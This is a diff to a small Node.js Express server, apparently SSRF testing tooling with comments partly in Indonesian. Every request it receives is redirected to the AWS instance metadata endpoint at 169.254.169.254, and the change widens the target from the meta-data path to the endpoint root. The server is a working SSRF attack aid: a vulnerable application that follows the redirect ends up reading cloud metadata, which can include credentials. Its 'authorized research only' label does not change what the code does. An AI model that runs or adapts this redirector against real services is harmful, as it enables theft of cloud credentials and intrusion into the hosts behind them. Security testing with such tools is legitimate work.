@@ -24,7 +24,7 @@ app.use((req, res, next) => {
 
 // Tangani semua route - redirect ke AWS metadata
 app.all('*', (req, res) => {
-    const targetURL = 'http://169.254.169.254/latest/meta-data/';
+    const targetURL = 'http://169.254.169.254/';
     
     res.set({
         'Location': targetURL,
@@ -67,7 +67,7 @@ app.get('/health', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 SSRF Redirect Server running on port ${PORT}`);
-    console.log(`📍 All requests redirect to: http://169.254.169.254/latest/meta-data/`);
+    console.log(`📍 All requests redirect to: http://169.254.169.254/`);
     console.log('✅ Health check available at: /health');
     console.log('⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY');
 });
